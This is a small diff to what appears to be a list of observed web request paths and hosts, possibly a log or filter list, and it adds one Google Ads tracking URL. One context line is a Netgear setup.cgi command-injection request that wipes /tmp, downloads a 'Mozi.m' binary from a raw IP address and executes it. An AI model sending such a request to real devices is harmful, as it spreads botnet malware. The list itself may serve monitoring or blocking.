@@ -17302,3 +17302,4 @@ pro.ip-api.com:443
 /eyzpeefh.php?Fox=d3wL7
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.49.195.75:34645/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /?gad_source=5&gclid=EAIaIQobChMIrYi73Z-6jAMVYisGAB1LLhCzEAEYASAAEgImPvD_BwE
+/?gad_source=5&gclid=CjwKCAjwwLO_BhB2EiwAx2e-31xPHbR-KrzjeZT8opi4Og8h9LtzlWSzksp_BA_hqdjJolpslFn3ihoCAioQAvD_BwE
